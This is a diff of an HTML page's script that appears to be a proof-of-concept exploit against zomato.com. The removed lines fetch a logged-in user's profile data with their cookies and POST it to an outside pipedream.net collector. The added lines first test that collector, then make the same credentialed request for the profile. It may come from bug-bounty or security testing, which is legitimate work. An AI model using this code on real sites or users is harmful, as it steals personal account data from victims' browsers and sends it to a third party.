@@ -8,30 +8,27 @@ function log(msg) {
     document.getElementById('status').innerHTML += msg + '<br>';
 }
 
-log('Starting...');
+log('Step 1: Testing RequestBin...');
 
-fetch('https://www.zomato.com/webroutes/getPage?page_url=/profile', {
-    credentials: 'include'
-})
-.then(response => {
-    log('Got response: ' + response.status);
-    return response.json();
-})
-.then(data => {
-    log('Got data: ' + JSON.stringify(data).substring(0, 100));
-    
-    // Send to RequestBin
-    return fetch('https://eomfuajl79ed6za.m.pipedream.net', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(data)
-    });
+// Test RequestBin first
+fetch('https://eomfuajl79ed6za.m.pipedream.net', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({test: 'hello'})
 })
 .then(() => {
-    log('Data sent successfully!');
+    log('Step 1: RequestBin works! ✓');
+    log('Step 2: Fetching zomato.com API...');
+    
+    return fetch('https://www.zomato.com/webroutes/getPage?page_url=/profile', {
+        credentials: 'include'
+    });
+})
+.then(response => {
+    log('Step 2: Got response: ' + response.status);
 })
 .catch(err => {
-    log('Error: ' + err.message);
+    log('ERROR at some step: ' + err.message);
 });
 </script>
 </body>
